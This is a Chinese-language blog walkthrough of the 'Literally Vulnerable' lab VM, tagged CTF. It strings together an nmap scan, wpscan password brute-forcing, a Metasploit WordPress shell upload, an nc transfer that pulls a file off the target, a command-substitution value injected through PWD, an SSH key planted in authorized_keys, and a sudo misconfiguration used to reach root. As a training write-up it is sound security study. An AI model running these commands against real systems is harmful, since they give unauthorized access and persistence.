@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>Literally Vulnerable | yichen&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="">
+    <meta name="description" content="首先 nmap 扫描端口nmap -p- -A 192.168.149.179                                                                                              image.png               有个 ftp 可以匿名登录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Literally Vulnerable">
+<meta property="og:url" content="https://yichen115.github.io/2020/07/07/ap3148/index.html">
+<meta property="og:site_name" content="yichen&#39;s blog">
+<meta property="og:description" content="首先 nmap 扫描端口nmap -p- -A 192.168.149.179                                                                                              image.png               有个 ftp 可以匿名登录">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1594112726338-6500c07c-ab67-4ea9-9ffe-18495df7e410.png#align=left&display=inline&height=471&margin=%5Bobject%20Object%5D&name=image.png&originHeight=700&originWidth=849&size=159172&status=done&style=none&width=571">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1594112785470-fb085c2f-d271-4425-b3e8-9ec20c0a2c90.png#align=left&display=inline&height=162&margin=%5Bobject%20Object%5D&name=image.png&originHeight=269&originWidth=712&size=28613&status=done&style=stroke&width=429">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1594112912086-020b8a8c-af0f-4d7e-8bb9-9408ec458f39.png#align=left&display=inline&height=197&margin=%5Bobject%20Object%5D&name=image.png&originHeight=351&originWidth=1015&size=52837&status=done&style=none&width=571">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1594115290719-cbb387ba-dc65-41f6-85c0-674f26b57af2.png#align=left&display=inline&height=330&margin=%5Bobject%20Object%5D&name=image.png&originHeight=659&originWidth=1560&size=988733&status=done&style=none&width=780">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1594115319654-732405f1-3cde-4f58-87a8-0a147f02f9dd.png#align=left&display=inline&height=519&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1037&originWidth=1920&size=122143&status=done&style=none&width=960">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1594116913025-1a1b919c-e9c5-4a37-bac2-8d9e3a6c30e4.png#align=left&display=inline&height=351&margin=%5Bobject%20Object%5D&name=image.png&originHeight=702&originWidth=1091&size=136267&status=done&style=none&width=545.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1594116807427-a51ace7f-9587-4370-80ba-cd4f4dc2bd2b.png#align=left&display=inline&height=308&margin=%5Bobject%20Object%5D&name=image.png&originHeight=616&originWidth=1091&size=120629&status=done&style=none&width=545.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1594117101095-5dad0776-29d8-4a89-9c35-8a1d6dfcab84.png#align=left&display=inline&height=308&margin=%5Bobject%20Object%5D&name=image.png&originHeight=615&originWidth=1230&size=61860&status=done&style=none&width=615">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1594117434636-e24bb863-bbe1-4c13-bf45-e57d70b92c0b.png#align=left&display=inline&height=324&margin=%5Bobject%20Object%5D&name=image.png&originHeight=648&originWidth=1906&size=87472&status=done&style=none&width=953">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1594212310437-15974a39-366f-40e5-b640-38b456123d08.png#align=left&display=inline&height=294&margin=%5Bobject%20Object%5D&name=image.png&originHeight=389&originWidth=582&size=27321&status=done&style=none&width=440">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1594212675072-9436434c-11c9-4758-9e9b-900d642204cf.png#align=left&display=inline&height=135&margin=%5Bobject%20Object%5D&name=image.png&originHeight=200&originWidth=810&size=221548&status=done&style=none&width=548">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1594213256619-8edf87a1-6ff8-43e4-9e52-cb01f59b1f8a.png#align=left&display=inline&height=210&margin=%5Bobject%20Object%5D&name=image.png&originHeight=420&originWidth=1248&size=621654&status=done&style=none&width=624">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1594213497460-3f8d0280-cd48-4633-ab22-c550e031a7de.png#align=left&display=inline&height=129&margin=%5Bobject%20Object%5D&name=image.png&originHeight=257&originWidth=1455&size=416652&status=done&style=none&width=727.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1594214054325-2529abcd-8859-4391-85aa-06be669df348.png#align=left&display=inline&height=85&margin=%5Bobject%20Object%5D&name=image.png&originHeight=169&originWidth=1426&size=299985&status=done&style=none&width=713">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1594214427592-09988795-2288-4e19-b32a-862b3057dba0.png#align=left&display=inline&height=86&margin=%5Bobject%20Object%5D&name=image.png&originHeight=131&originWidth=689&size=101878&status=done&style=none&width=453">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1594214533635-a17f7f4f-b795-4a9a-a7d3-10a5f270c317.png#align=left&display=inline&height=221&margin=%5Bobject%20Object%5D&name=image.png&originHeight=442&originWidth=1084&size=603502&status=done&style=none&width=542">
+<meta property="article:published_time" content="2020-07-07T09:01:47.000Z">
+<meta property="article:modified_time" content="2022-10-03T13:52:43.681Z">
+<meta property="article:author" content="yichen">
+<meta property="article:tag" content="网络安全 CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1594112726338-6500c07c-ab67-4ea9-9ffe-18495df7e410.png#align=left&display=inline&height=471&margin=%5Bobject%20Object%5D&name=image.png&originHeight=700&originWidth=849&size=159172&status=done&style=none&width=571">
+    
+        <link rel="alternate" type="application/atom+xml" title="yichen&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.png">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">yichen</h5>
+          <a href="mailto:1097179511@qq.com" title="1097179511@qq.com" class="mail">1097179511@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-grav"></i>
+                语雀
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://passport.kanxue.com/user-center-837755.htm" target="_blank" >
+                <i class="icon icon-lg icon-snowflake-o"></i>
+                看雪
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="http://sighttp.qq.com/msgrd?v=1&uin=1097179511" target="_blank" >
+                <i class="icon icon-lg icon-qq"></i>
+                QQ
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://img2020.cnblogs.com/blog/1558534/202003/1558534-20200331231408805-256812285.jpg" target="_blank" >
+                <i class="icon icon-lg icon-wechat"></i>
+                微信
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/yichen115" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Literally Vulnerable</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Literally Vulnerable</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-07-07T09:01:47.000Z" itemprop="datePublished" class="page-time">
+  2020-07-07
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+<meta name="referrer" content="no-referrer" />
+
+<div class="container body-wrap">
+    
+
+<article id="post-ap3148"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Literally Vulnerable</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-07-07 17:01:47" datetime="2020-07-07T09:01:47.000Z"  itemprop="datePublished">2020-07-07</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>首先 nmap 扫描端口<br>nmap -p- -A 192.168.149.179</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594112726338-6500c07c-ab67-4ea9-9ffe-18495df7e410.png#align=left&display=inline&height=471&margin=%5Bobject%20Object%5D&name=image.png&originHeight=700&originWidth=849&size=159172&status=done&style=none&width=571" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>有个 ftp 可以匿名登录</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594112785470-fb085c2f-d271-4425-b3e8-9ec20c0a2c90.png#align=left&display=inline&height=162&margin=%5Bobject%20Object%5D&name=image.png&originHeight=269&originWidth=712&size=28613&status=done&style=stroke&width=429" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>下下来看一下，</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594112912086-020b8a8c-af0f-4d7e-8bb9-9408ec458f39.png#align=left&display=inline&height=197&margin=%5Bobject%20Object%5D&name=image.png&originHeight=351&originWidth=1015&size=52837&status=done&style=none&width=571" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>去扫一下 <a href="http://192.168.149.179:65535/" target="_blank" rel="noopener">http://192.168.149.179:65535/</a> 扫出来一个 phpcms</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594115290719-cbb387ba-dc65-41f6-85c0-674f26b57af2.png#align=left&display=inline&height=330&margin=%5Bobject%20Object%5D&name=image.png&originHeight=659&originWidth=1560&size=988733&status=done&style=none&width=780" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>这里有个验证密码才能看的，用之前 ftp 保存下来的密码试一下</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594115319654-732405f1-3cde-4f58-87a8-0a147f02f9dd.png#align=left&display=inline&height=519&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1037&originWidth=1920&size=122143&status=done&style=none&width=960" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>wpscan –url <a href="http://192.168.149.179:65535/phpcms/" target="_blank" rel="noopener">http://192.168.149.179:65535/phpcms/</a> –enumerate<br>收集一下用户名</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594116913025-1a1b919c-e9c5-4a37-bac2-8d9e3a6c30e4.png#align=left&display=inline&height=351&margin=%5Bobject%20Object%5D&name=image.png&originHeight=702&originWidth=1091&size=136267&status=done&style=none&width=545.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>wpscan –url <a href="http://192.168.149.179:65535/phpcms/" target="_blank" rel="noopener">http://192.168.149.179:65535/phpcms/</a> -U user.txt -P pass.txt<br>爆破一下账号密码<br>Username: maybeadmin, Password: $EPid%J2L9LufO5</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594116807427-a51ace7f-9587-4370-80ba-cd4f4dc2bd2b.png#align=left&display=inline&height=308&margin=%5Bobject%20Object%5D&name=image.png&originHeight=616&originWidth=1091&size=120629&status=done&style=none&width=545.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后登录后台看一下，可以找到另一组账号密码<br>notadmin:Pa$$w0rd13!&amp;</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594117101095-5dad0776-29d8-4a89-9c35-8a1d6dfcab84.png#align=left&display=inline&height=308&margin=%5Bobject%20Object%5D&name=image.png&originHeight=615&originWidth=1230&size=61860&status=done&style=none&width=615" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594117434636-e24bb863-bbe1-4c13-bf45-e57d70b92c0b.png#align=left&display=inline&height=324&margin=%5Bobject%20Object%5D&name=image.png&originHeight=648&originWidth=1906&size=87472&status=done&style=none&width=953" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后用 msf 连接一下 exploit/unix/webapp/wp_admin_shell_upload<br>notadmin<br>Pa$$w0rd13!&amp;<br>192.168.149.179<br>65535<br>/phpcms</p>
+<p>python3 -c ‘import pty; pty.spawn(“/bin/bash”)’</p>
+<p>在 /home/doe 目录下有一个 itseasy 文件，执行会返回当前路径<br>wsl：nc -lvp 10001 &gt;itseasy<br>靶机：nc 192.168.149.1 10001 &lt;itseasy<br>把这个文件给弄出来，IDA 打开看一下</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594212310437-15974a39-366f-40e5-b640-38b456123d08.png#align=left&display=inline&height=294&margin=%5Bobject%20Object%5D&name=image.png&originHeight=389&originWidth=582&size=27321&status=done&style=none&width=440" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>C 库函数 char *getenv(const char *name) 搜索 name 所指向的环境字符串，并返回相关的值给字符串，在这里就是 PWD 所指向的，我们可以改一下，从而获得一个 shell<br>实际上是请求了 PWD（一个 web 靶机，用上了 IDA 我是没想到的）</p>
+<p><code>export PWD=\$\(/bin/bash\)</code><br>然后再执行那个文件就能拿到 john 用户的 shell</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594212675072-9436434c-11c9-4758-9e9b-900d642204cf.png#align=left&display=inline&height=135&margin=%5Bobject%20Object%5D&name=image.png&originHeight=200&originWidth=810&size=221548&status=done&style=none&width=548" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>现在有个问题是 ls，cat 之类的是不回显的，所以考虑一下把 ssh 的 authorized_keys 写成 wsl 的公钥，用 ssh 　登上去（john 用户还没有 .ssh 文件夹，新建一个）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyab46KTnUD6PBqNHweAB+SfDl36waT1RpkBUB3rcmP7QhRk4EOh0yShEmGCA2fev/A/9BY2LP2nd4EplGNYn14OgHONtXH74fSCqf0QZGMexQ9BkV5pHOTW+nGapxeaUTzyEkQQvDLnLm05Oqx6F9d5pfHIrbfQLBK7J0zY1BpkflT3I8pBzEdzLCWoG4Z62WGKQ0Q0ldm9NkRoEbZSOUxneazHiVa89mORtdtHXRr3nseLOyN17rJh6c2CF8ZtlLHIp12GOl0A6qm0eFW4KSJJvZCdxhX/p83hfCclFw7dckX1n+Q45GjuUF/ZE8IXmKRkwNDxOZalSgFjyYX+RlMr95Ruv8IaMk8tv5+Ut04cquKUgCn/9ksLRyL7+fJFok1EEupo4ZjTx3DlBNdkSch3IPT1XVgZeapqUik7jt5DgeGmGKBF93kE9pLO+2+3l1KntdeZ3abJHXDWzX6/mqRNtvMzdVik0jQGOjnGz1Yck0z9w8BK8BGtZ+917Kvns= 1097179511@qq.com"</span> &gt; authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p>登录成功，舒服了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594213256619-8edf87a1-6ff8-43e4-9e52-cb01f59b1f8a.png#align=left&display=inline&height=210&margin=%5Bobject%20Object%5D&name=image.png&originHeight=420&originWidth=1248&size=621654&status=done&style=none&width=624" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>另外他还藏了个密码，base64 解码之后是：john:YZW$s8Y49IB#ZZJ</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594213497460-3f8d0280-cd48-4633-ab22-c550e031a7de.png#align=left&display=inline&height=129&margin=%5Bobject%20Object%5D&name=image.png&originHeight=257&originWidth=1455&size=416652&status=done&style=none&width=727.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>这时候 sudo -l 可以发现有个文件是可以不需要密码就能 sudo 运行的</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594214054325-2529abcd-8859-4391-85aa-06be669df348.png#align=left&display=inline&height=85&margin=%5Bobject%20Object%5D&name=image.png&originHeight=169&originWidth=1426&size=299985&status=done&style=none&width=713" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>文件夹只有 www-data 账户可以写入，所以还是要回到 www-data 的 shell，写个 /bin/sh，然后 sudo 一执行就能拿到 root 权限的 shell</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594214427592-09988795-2288-4e19-b32a-862b3057dba0.png#align=left&display=inline&height=86&margin=%5Bobject%20Object%5D&name=image.png&originHeight=131&originWidth=689&size=101878&status=done&style=none&width=453" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594214533635-a17f7f4f-b795-4a9a-a7d3-10a5f270c317.png#align=left&display=inline&height=221&margin=%5Bobject%20Object%5D&name=image.png&originHeight=442&originWidth=1084&size=603502&status=done&style=none&width=542" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2022-10-03T13:52:43.681Z" itemprop="dateUpdated">2022-10-03 21:52:43</time>
+</span><br>
+
+
+        
+    </div>
+    
+    <footer>
+        <a href="https://yichen115.github.io">
+            <img src="/img/avatar.png" alt="yichen">
+            yichen
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/07/07/ap3148/&title=《Literally Vulnerable》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/07/07/ap3148/&title=《Literally Vulnerable》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/07/07/ap3148/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Literally Vulnerable》 — yichen's blog&url=https://yichen115.github.io/2020/07/07/ap3148/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/07/07/ap3148/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/07/12/gcqapk/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">upload-labs</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/06/29/iq0f33/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">temp</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.jpg" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>yichen &copy; 2020 - 2022</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/07/07/ap3148/&title=《Literally Vulnerable》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/07/07/ap3148/&title=《Literally Vulnerable》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/07/07/ap3148/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Literally Vulnerable》 — yichen's blog&url=https://yichen115.github.io/2020/07/07/ap3148/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/07/07/ap3148/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://yichen115.github.io/2020/07/07/ap3148/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '记得回来啊！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '欢迎回来!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
